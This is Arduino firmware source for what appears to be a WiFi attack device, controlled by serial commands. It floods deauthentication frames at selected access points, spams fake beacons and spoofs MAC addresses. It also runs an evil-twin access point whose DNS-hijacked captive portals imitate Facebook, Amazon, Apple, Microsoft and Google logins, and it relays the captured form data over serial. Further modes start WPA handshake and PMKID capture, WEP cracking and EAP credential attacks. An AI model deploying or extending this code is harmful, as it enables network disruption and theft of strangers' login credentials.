#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_handshake_capture.h"
#include "wifi_wep_crack.h"
#include "wifi_eap_attack.h"
#include "error_handler.h"
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"

//Captive portals
#include "portals/compressed/facebook.h"
#include "portals/compressed/amazon.h"
#include "portals/compressed/apple.h"
#include "portals/compressed/microsoft.h"
#include "portals/compressed/google.h"
#include "portals/default.h"

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple,
  Microsoft,
  Google
};

// Arduino兼容性常量定义
#define MAX_SCAN_RESULTS 100
#define MAX_DEAUTH_TARGETS 20
#define MAX_TEMP_TARGETS 20

//DNS

#include "dns.h"
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>

#define MIN(a, b) ((a) < (b) ? (a) : (b))

#define BAUD 115200

//PORTALS




typedef struct {
  char ssid[33];        // 802.11标准最大SSID长度32+1
  char bssid_str[18];   // "XX:XX:XX:XX:XX:XX" + 1
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;


const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};


// Arduino兼容的固定大小数组
WiFiScanResult scan_results[MAX_SCAN_RESULTS];
uint8_t scan_results_count = 0;
int deauth_wifis[MAX_DEAUTH_TARGETS];
uint8_t deauth_wifis_count = 0;
int wifis_temp[MAX_TEMP_TARGETS];
uint8_t wifis_temp_count = 0;
//WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID, rickroll;
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal=0;
int localPortNew=1000;
char wpa_pass[64];
char ap_channel[4];
bool secured=false;
//"00:E0:4C:01:02:03"
__u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac=false;

// 握手包捕获相关变量
bool handshake_capture_mode = false;
uint32_t handshake_capture_start_time = 0;

// WEP破解相关变量
bool wep_crack_mode = false;
uint32_t wep_crack_start_time = 0;

// EAP攻击相关变量
bool eap_attack_mode = false;
uint32_t eap_attack_start_time = 0;
//int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
extern u8 rtw_get_band_type(void);
#define FRAMES_PER_DEAUTH 5
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

//DNS
bool apActive = false;


int status = WL_IDLE_STATUS;   

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    // 检查数组容量
    if (scan_results_count >= MAX_SCAN_RESULTS) {
      DEBUG_SER_PRINT("Warning: Maximum scan results reached\n");
      return RTW_SUCCESS;
    }
    
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult* result = &scan_results[scan_results_count];
    
    // 使用固定大小字符数组而不是String
    strncpy(result->ssid, (const char *)record->SSID.val, sizeof(result->ssid) - 1);
    result->ssid[sizeof(result->ssid) - 1] = '\0';
    if(strlen(result->ssid) == 0) {
      strcpy(result->ssid, "<empty>");
    }
    
    result->channel = record->channel;
    result->rssi = record->signal_strength;
    
    memcpy(&result->bssid, &record->BSSID, 6);
    snprintf(result->bssid_str, sizeof(result->bssid_str), 
             "%02X:%02X:%02X:%02X:%02X:%02X", 
             result->bssid[0], result->bssid[1], result->bssid[2], 
             result->bssid[3], result->bssid[4], result->bssid[5]);
    
    result->security = record->security;
    scan_results_count++;
  }
  return RTW_SUCCESS;
}
WiFiServer server(80);
bool serveBegined =false;


void createAP(char* ssid, char* channel, char* password){
  int mode;
  const char* ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);


  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  while (status != WL_CONNECTED) {
    DEBUG_SER_PRINT("CREATING AP 2");
      if(strcmp(password,"")==0){
        status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
      }else{
        status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
      }
      delay(1000);
  }
  unbind_dns();
  delay(1000);

  //Creamos un nuevo servicio de dns
  start_DNS_Server();
  if(!serveBegined){
    server.begin();
    serveBegined=true;
  }
  apActive = true;
  ifname = WLAN0_NAME;
  wext_get_mode(ifname, &mode);

  Serial.print("WLAN 0 ");
  Serial.println(mode);

  ifname = WLAN1_NAME;
  wext_get_mode(ifname, &mode);
  Serial.print("WLAN 1 ");
  Serial.println(mode);
}
void createAP(char* ssid, char* channel){

  createAP(ssid, channel, "");
}
void destroyAP(){
  //udp_remove(dns_server_pcb);
  
  void unbind_all_udp();
  delay(500);
  WiFiClient client = server.available();
  while(client.connected()){
    DEBUG_SER_PRINT("PArando cliente");
    DEBUG_SER_PRINT(client);
    client.flush();
    client.stop();
    client = server.available();
  }
  apActive=false;
  delay(500);
  wifi_off();
  delay(500);
  WiFiDrv::wifiDriverInit();
  wifi_on(RTW_MODE_STA_AP);
  status = WL_IDLE_STATUS;   
  delay(500);
  WiFi.enableConcurrent();

  WiFi.status();
  int channel;
  wifi_get_channel(&channel);



}


String makeResponse(int code, String content_type, bool compresed) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  if(compresed)
  response += "Content-Encoding: gzip\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain",false);
  response += "Not found!";
  client.write(response.c_str());
}


void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
  const char *webPage;
  size_t len;
  bool compresed = false;
  switch(portalType){
    case Default:
      webPage = default_web(ssid);
      len = strlen(webPage);
      break;
    case Facebook:
      webPage = (const char*)facebook;
      len = facebook_len;
      break;
    case Amazon:
      webPage = (const char*)amazon;
      len = amazon_len;
      break;
    case Apple:
      webPage = (const char *)apple;
      len = apple_len;
      break;
    case Google:
      webPage = (const char *)google;
      len = google_len;
      break;
    case Microsoft:
      webPage = (const char *)microsoft;
      len = microsoft_len;
      break;
    default:
      webPage = default_web(ssid);
  }
  Serial.print("Heap libre header:");
  Serial.println(xPortGetFreeHeapSize());
  if(webPage[0]==0x1f && webPage[1]==0x8b){
    compresed=true;
  }
  
  String response = makeResponse(200, "text/html", compresed);
  client.write(response.c_str());
  
   

  size_t chunkSize = 5000;

  for (size_t i = 0; i < len; i += chunkSize) {
        size_t sendSize = MIN(chunkSize, len - i);
        while(client.available()){
            client.read();
            delay(10);
            }
            Serial.print("Heap libre write:");
        Serial.println(xPortGetFreeHeapSize());
        if(client.connected()){
          client.write((const uint8_t *)(webPage + i), sendSize);
          if(client.getWriteError())return;
        }else{
          return;
        }
        delay(1);
  }

  delay(10);
   while(client.available()){
            client.read();
            delay(1);
            }
}

int scanNetworks(int miliseconds) {
  char temp_msg[100];
  snprintf(temp_msg, sizeof(temp_msg), "Scanning WiFi networks (%d ms)...\n", miliseconds);
  DEBUG_SER_PRINT(temp_msg);
  
  // 清空扫描结果数组
  scan_results_count = 0;
  memset(scan_results, 0, sizeof(scan_results));
  
  snprintf(temp_msg, sizeof(temp_msg), "wifi get band type:%d\n", wifi_get_band_type());
  DEBUG_SER_PRINT(temp_msg);
  DEBUG_SER_PRINT("scan results cleared...");
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    digitalWrite(LED_B,false);
    for (int i =0;i<miliseconds/100;i++){
      digitalWrite(LED_G, !digitalRead(LED_G));
      delay(100);

    }
    digitalWrite(LED_B,true);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String readString;

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  Serial.begin(BAUD);
  Serial1.begin(BAUD);
  readString.reserve(50);
  DEBUG_SER_PRINT("Iniciando\n");
  
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);

  // 初始化握手包捕获系统
  init_handshake_capture();
  // 初始化WEP破解系统
  init_wep_crack();
  // 初始化EAP攻击系统
  init_eap_attack();
  // 初始化错误处理系统
  DEBUG_SER_PRINT("Error handling system initialized\n");
  wifi_rx_init();

  digitalWrite(LED_B, HIGH);
}
String ssid="";
uint32_t current_num = 0;

void loop() {
  while (Serial1.available()) {
    delay(3);  //delay to allow buffer to fill 
    if (Serial1.available() >0) {
      char c = Serial1.read();  //gets one byte from serial buffer
      readString += c; //makes the string readString
    } 
  }
  if(readString.length()>0){
    if(readString.substring(0,4)=="SCAN"){
      if(apActive)
        destroyAP();
      deauth_wifis_count = 0;
      DEBUG_SER_PRINT("Stop randomSSID\n");
      randomSSID = false;
      rickroll=false;
      ssid="";

      while (scanNetworks(5000)){
        delay(1000);
      }
      Serial1.print("SCAN:OK\n");
      Serial.print("SCAN:OK\n");
      
    }else if(readString.substring(0,4)=="STOP"){
      DEBUG_SER_PRINT("Stop deauthing\n");
      
      secured = false;
      strcpy(wpa_pass,"");
      if(readString.length()>5 && !apActive){
        unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
        if(numStation < scan_results_count){
          wifis_temp_count = 0;
          unsigned int num_st_tmp;
          
          // 复制除了指定目标外的所有目标到临时数组
          for(unsigned int i=0; i<deauth_wifis_count; i++){
            num_st_tmp=deauth_wifis[i];
            if(num_st_tmp != numStation && wifis_temp_count < MAX_TEMP_TARGETS){
              wifis_temp[wifis_temp_count++] = num_st_tmp;
            }
          }
          
          // 将临时数组复制回主数组
          deauth_wifis_count = 0;
          for(unsigned int i=0; i<wifis_temp_count && deauth_wifis_count < MAX_DEAUTH_TARGETS; i++){
            deauth_wifis[deauth_wifis_count++] = wifis_temp[i];
          }
        }
      }else{
        destroyAP();
        deauth_wifis_count = 0;
        DEBUG_SER_PRINT("Stop randomSSID\n");
        randomSSID = false;
        rickroll=false;
        ssid="";
      }
      digitalWrite(LED_G, 0);
       
    }else if(readString.substring(0,6)=="RANDOM"){
      DEBUG_SER_PRINT("Start randomSSID\n");
      randomSSID = true;
        
    }else if(readString.substring(0,5)=="BSSID"){
      
      ssid = readString.substring(6,readString.length()-1);
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,7)=="APSTART"){
      char ssid[33];  // o el tamaño que necesites
      
      String ap_ssid = readString.substring(8,readString.length()-1);
      ap_ssid.toCharArray(ssid, 33);
      if(secured){
        createAP(ssid, ap_channel,wpa_pass);
      }else{
        createAP(ssid,ap_channel);
      }
      DEBUG_SER_PRINT("Starting BSSID "+ap_ssid+"\n");
        if(!serveBegined){
          server.begin();
          serveBegined=true;
        }
        apActive = true;

    }else if(readString.substring(0,8)=="RICKROLL"){
      
      rickroll =true;
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,6)=="PORTAL"){
      portal = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,6)=="REASON"){
      deauth_reason = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,8)=="PASSWORD"){
      String password;
      password = readString.substring(9,readString.length()-1).c_str();
      password.toCharArray(wpa_pass, 64);
      Serial.println(password);
      Serial.println(wpa_pass);
      secured=true;

      
    
    }else if(readString.substring(0,7)=="CHANNEL"){
    readString.substring(8,readString.length()-1).toCharArray(ap_channel,4);


    }else if(readString.substring(0,5)=="APMAC"){
      String mac;
      mac = readString.substring(6,readString.length()-1);
      //wifi_disconnect();
      DEBUG_SER_PRINT("APMAC "+mac+"\n");
      if(mac.length()==17){
        useCustomMac=true;
        
        char macStr[18]; 
        mac.toCharArray(macStr, sizeof(macStr)); 

        char *token = strtok(macStr, ":");
        int i = 0;

        while (token != NULL && i < 6) {
            customMac[i] = strtoul(token, NULL, 16);
            token = strtok(NULL, ":");
            i++;
        }
        


        Serial.print("MAC en bytes: ");
        for (int i = 0; i < 6; i++) {
            if (customMac[i] < 0x10) Serial.print("0"); 
            Serial.print(customMac[i], HEX);
            if (i < 7) Serial.print(":");
        }
        Serial.println();
        mac.replace(":","");
        int ret = wifi_change_mac_address_from_ram(1,customMac);
        if(ret==RTW_ERROR){
          Serial1.println("ERROR:Bad Mac");
          Serial.println("ERROR:Bad Mac");
        }
      }else{
        useCustomMac=false;
      }
       
    }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
      int numStation;
      if(readString.substring(0,4)=="EVIL"){
        numStation = readString.substring(5,readString.length()-1).toInt();
      }else{
        numStation = readString.substring(7,readString.length()-1).toInt();
      }
      if(numStation < (int)scan_results_count && numStation >=0){
        char temp_msg[100];
        snprintf(temp_msg, sizeof(temp_msg), "Deauthing %d\n", numStation);
        DEBUG_SER_PRINT(temp_msg);
        
        // 添加到去认证目标数组
        if(deauth_wifis_count < MAX_DEAUTH_TARGETS) {
          deauth_wifis[deauth_wifis_count++] = numStation;
        }
        
        snprintf(temp_msg, sizeof(temp_msg), "Deauthing %s\n", scan_results[numStation].ssid);
        DEBUG_SER_PRINT(temp_msg);
        if(readString.substring(0,4)=="EVIL"){
          int str_len = strlen(scan_results[numStation].ssid) + 1; 

          // Prepare the character array (the buffer) 
          char char_array[str_len];

          // Copy it over 
          strcpy(char_array, scan_results[numStation].ssid);
          char buffer[4];  // Suficiente para "123\0"
          itoa(scan_results[numStation].channel, buffer, 10);
          if(str_len>1)
            createAP(char_array, buffer);
          else
            Serial1.print("ERROR: BAD SSID, please try to rescan again");
        }
      

      }else{
        DEBUG_SER_PRINT("Wrong AP");
      }
      

    }else if(readString.substring(0,4)=="PING"){
      
      Serial.print("PONG\n");
      Serial1.print("PONG\n");
      
    }else if(readString.substring(0,4)=="LIST"){
      
      for (uint i = 0; i < scan_results_count; i++) {
        char temp_msg[200];
        snprintf(temp_msg, sizeof(temp_msg), "AP:%d|%s|", i, scan_results[i].ssid);
        Serial.print(temp_msg);
        Serial1.print(temp_msg);
        for (int j = 0; j < 6; j++) {
          if (j > 0){
             Serial.print(":");
             Serial1.print(":");
          }
          Serial.print(scan_results[i].bssid[j], HEX);
          Serial1.print(scan_results[i].bssid[j], HEX);
          
        }
        char channel_sec_rssi[50];
        snprintf(channel_sec_rssi, sizeof(channel_sec_rssi), "|%d|%d|%d\n", 
                scan_results[i].channel, scan_results[i].security, scan_results[i].rssi);
        Serial.print(channel_sec_rssi);
        Serial1.print(channel_sec_rssi);
      }
      
    }else if(readString.substring(0,8)=="HANDSHAKE"){
      // 握手包捕获命令
      if(readString.substring(9,11)=="ON"){
        enable_handshake_capture();
        wifi_rx_start_monitor();
        handshake_capture_mode = true;
        handshake_capture_start_time = millis();
        Serial1.print("HANDSHAKE:STARTED\n");
        Serial.print("HANDSHAKE:STARTED\n");
        DEBUG_SER_PRINT("Handshake capture started\n");
      }else if(readString.substring(9,12)=="OFF"){
        disable_handshake_capture();
        wifi_rx_stop_monitor();
        handshake_capture_mode = false;
        Serial1.print("HANDSHAKE:STOPPED\n");
        Serial.print("HANDSHAKE:STOPPED\n");
        DEBUG_SER_PRINT("Handshake capture stopped\n");
      }else if(readString.substring(9,12)=="STAT"){
        // 返回握手包捕获状态
        uint32_t total_count = get_handshake_count();
        uint32_t complete_count = get_complete_handshake_count();
        uint32_t pmkid_count = get_pmkid_count();
        String status = "HANDSHAKE:STAT|TOTAL:" + String(total_count) + "|COMPLETE:" + String(complete_count) + "|PMKID:" + String(pmkid_count) + "|ACTIVE:" + String(handshake_capture_mode ? "YES" : "NO") + "\n";
        Serial1.print(status);
        Serial.print(status);
      }else if(readString.substring(9,12)=="EXPORT"){
        // 导出所有握手包数据
        export_all_handshakes();
        Serial1.print("HANDSHAKE:EXPORTED\n");
        Serial.print("HANDSHAKE:EXPORTED\n");
      }else if(readString.substring(9,12)=="CLEAR"){
        // 清除所有握手包数据
        clear_all_handshakes();
        Serial1.print("HANDSHAKE:CLEARED\n");
        Serial.print("HANDSHAKE:CLEARED\n");
      }else if(readString.substring(9,13)=="PMKID"){
        // 导出PMKID数据
        export_all_pmkids();
        Serial1.print("HANDSHAKE:PMKID_EXPORTED\n");
        Serial.print("HANDSHAKE:PMKID_EXPORTED\n");
      }
      
    }else if(readString.substring(0,3)=="WEP"){
      // WEP破解命令
      if(readString.substring(4,6)=="ON"){
        enable_wep_crack();
        wifi_rx_start_monitor();
        wep_crack_mode = true;
        wep_crack_start_time = millis();
        Serial1.print("WEP:STARTED\n");
        Serial.print("WEP:STARTED\n");
        DEBUG_SER_PRINT("WEP crack started\n");
      }else if(readString.substring(4,7)=="OFF"){
        disable_wep_crack();
        wifi_rx_stop_monitor();
        wep_crack_mode = false;
        Serial1.print("WEP:STOPPED\n");
        Serial.print("WEP:STOPPED\n");
        DEBUG_SER_PRINT("WEP crack stopped\n");
      }else if(readString.substring(4,7)=="STAT"){
        // 返回WEP破解状态
        uint32_t total_sessions = get_wep_session_count();
        uint32_t active_sessions = get_active_wep_sessions();
        uint32_t cracked_sessions = get_cracked_wep_sessions();
        String status = "WEP:STAT|TOTAL:" + String(total_sessions) + "|ACTIVE:" + String(active_sessions) + "|CRACKED:" + String(cracked_sessions) + "|ACTIVE:" + String(wep_crack_mode ? "YES" : "NO") + "\n";
        Serial1.print(status);
        Serial.print(status);
        
        // 发送详细统计信息
        String detailed_status = get_wep_crack_status();
        Serial1.print("WEP:DETAIL:");
        Serial1.println(detailed_status);
        Serial.print("WEP:DETAIL:");
        Serial.println(detailed_status);
      }else if(readString.substring(4,7)=="EXPORT"){
        // 导出所有WEP数据
        export_all_wep_data();
        Serial1.print("WEP:EXPORTED\n");
        Serial.print("WEP:EXPORTED\n");
      }else if(readString.substring(4,7)=="CLEAR"){
        // 清除所有WEP数据
        clear_all_wep_data();
        Serial1.print("WEP:CLEARED\n");
        Serial.print("WEP:CLEARED\n");
      }else if(readString.substring(4,7)=="ALGO"){
        // 设置WEP破解算法
        String algo_str = readString.substring(8);
        int algo = algo_str.toInt();
        if (algo >= 0 && algo <= 5) {
          current_crack_algorithm = (WEPCrackAlgorithm)algo;
          Serial1.print("WEP:ALGO:");
          Serial1.print(algo);
          Serial1.print("\n");
          Serial.print("WEP:ALGO:");
          Serial.print(algo);
          Serial.print("\n");
        }
      }
      
    }else if(readString.substring(0,3)=="EAP"){
      // EAP攻击命令
      if(readString.substring(4,7)=="MD5"){
        enable_eap_attack(EAP_ATTACK_MD5);
        wifi_rx_start_monitor();
        eap_attack_mode = true;
        eap_attack_start_time = millis();
        Serial1.print("EAP:MD5_STARTED\n");
        Serial.print("EAP:MD5_STARTED\n");
        DEBUG_SER_PRINT("EAP MD5 attack started\n");
      }else if(readString.substring(4,8)=="LEAP"){
        enable_eap_attack(EAP_ATTACK_LEAP);
        wifi_rx_start_monitor();
        eap_attack_mode = true;
        eap_attack_start_time = millis();
        Serial1.print("EAP:LEAP_STARTED\n");
        Serial.print("EAP:LEAP_STARTED\n");
        DEBUG_SER_PRINT("EAP LEAP attack started\n");
      }else if(readString.substring(4,7)=="GTC"){
        enable_eap_attack(EAP_ATTACK_GTC);
        wifi_rx_start_monitor();
        eap_attack_mode = true;
        eap_attack_start_time = millis();
        Serial1.print("EAP:GTC_STARTED\n");
        Serial.print("EAP:GTC_STARTED\n");
        DEBUG_SER_PRINT("EAP GTC attack started\n");
      }else if(readString.substring(4,8)=="TTLS"){
        enable_eap_attack(EAP_ATTACK_TTLS);
        wifi_rx_start_monitor();
        eap_attack_mode = true;
        eap_attack_start_time = millis();
        Serial1.print("EAP:TTLS_STARTED\n");
        Serial.print("EAP:TTLS_STARTED\n");
        DEBUG_SER_PRINT("EAP TTLS attack started\n");
      }else if(readString.substring(4,8)=="PEAP"){
        enable_eap_attack(EAP_ATTACK_PEAP);
        wifi_rx_start_monitor();
        eap_attack_mode = true;
        eap_attack_start_time = millis();
        Serial1.print("EAP:PEAP_STARTED\n");
        Serial.print("EAP:PEAP_STARTED\n");
        DEBUG_SER_PRINT("EAP PEAP attack started\n");
      }else if(readString.substring(4,7)=="OFF"){
        disable_eap_attack();
        wifi_rx_stop_monitor();
        eap_attack_mode = false;
        Serial1.print("EAP:STOPPED\n");
        Serial.print("EAP:STOPPED\n");
        DEBUG_SER_PRINT("EAP attack stopped\n");
      }else if(readString.substring(4,7)=="STAT"){
        // 返回EAP攻击状态
        uint32_t total_sessions = get_eap_session_count();
        uint32_t active_sessions = get_active_eap_sessions();
        uint32_t captured_sessions = get_captured_eap_sessions();
        String attack_type = eap_type_to_string(get_current_attack_type());
        String status = "EAP:STAT|TOTAL:" + String(total_sessions) + 
                       "|ACTIVE:" + String(active_sessions) + 
                       "|CAPTURED:" + String(captured_sessions) + 
                       "|TYPE:" + attack_type + 
                       "|ACTIVE:" + String(eap_attack_mode ? "YES" : "NO") + "\n";
        Serial1.print(status);
        Serial.print(status);
      }else if(readString.substring(4,7)=="EXPORT"){
        // 导出所有EAP数据
        export_all_eap_data();
        Serial1.print("EAP:EXPORTED\n");
        Serial.print("EAP:EXPORTED\n");
      }else if(readString.substring(4,7)=="CLEAR"){
        // 清除所有EAP数据
        clear_all_eap_data();
        Serial1.print("EAP:CLEARED\n");
        Serial.print("EAP:CLEARED\n");
      }
      
    }
    readString="";

  }
  
  // 定期清理过期的握手包会话
  if (handshake_capture_mode && (millis() - handshake_capture_start_time) % 30000 < 100) {
    cleanup_old_sessions();
  }
  
  // 定期清理过期的WEP破解会话
  if (wep_crack_mode && (millis() - wep_crack_start_time) % 30000 < 100) {
    cleanup_old_wep_sessions();
  }
  
  // 定期清理过期的EAP攻击会话
  if (eap_attack_mode && (millis() - eap_attack_start_time) % 30000 < 100) {
    cleanup_old_eap_sessions();
  }
  
  // 系统健康监控
  monitor_eap_system_health();
  
  // 定期打印系统状态
  static uint32_t last_status_print = 0;
  if (millis() - last_status_print > 300000) { // 每5分钟
    print_system_status();
    last_status_print = millis();
  }
  
  // 定期检查内存使用
  static uint32_t last_memory_check = 0;
  if (millis() - last_memory_check > 60000) { // 每1分钟
    check_memory_usage();
    last_memory_check = millis();
  }
  
  if (deauth_wifis_count > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis_count) current_num = 0;
    digitalWrite(LED_R, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_R, LOW);
    delay(50);
  }

  if (randomSSID){
    digitalWrite(LED_G, !digitalRead(LED_G));
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }
  if (rickroll){
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v; v < 8; v++){
      String ssid2 = rick_roll[v];
      for(int i=0;i<7;i++){
        byte randomByte = random(0x00, 0xFF);
        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
      } 
    
      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME,v+1);
      for(int x=0;x<5;x++){
       wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
      }
    }
  }
  if(ssid!=""){
    int channel = 5;
    digitalWrite(LED_G, !digitalRead(LED_G));
    wext_set_channel(WLAN0_NAME,channel);
    const char * ssid_cstr2 = ssid.c_str();
    for(int x=0; x<5; x++){
      DEBUG_SER_PRINT("START "+ssid);
      wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }

  }
  
  if (apActive) {
    WiFiClient client = server.available();
    if (client) {
      //client.setRecvTimeout(500);
      String request;
      request.reserve(256);  // Reservamos memoria para evitar fragmentación
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      while (client.connected()) {
        if (client.available()) {
          char character = client.read();
          if (character == '\n') {
            while(client.available()){
            character=client.read();
            client.clearWriteError();
            
            delay(1);
            }
            String path = parseRequest(request);
            Serial.println(request);
            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
              if (deauth_wifis_count != 0)
                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
              else
                handleRequest(client, (enum portals)portal, "router");
              if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
                String datos = path.substring(path.indexOf('?') + 1);
                if (datos.length() > 0) {
                  Serial1.print("EV:");
                  Serial1.println(datos);
                }
              }
          }else{
            handle404(client);
          }   
          break;

          }else if(character == '%'){
            char buff[2] ;
            client.read(buff,2);
            char value = (char)strtol(buff, NULL, 16);
            if(value <= 127){
              character = value;
            }else{
              request += "%";
              request += buff[0];
              request += buff[1];
            }

          } 
          request += character;

          
          delay(10);
        }
      }
      

      // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      

      delay(50);  // menor delay, no saturar
      client.stop();

    }
  }
  
}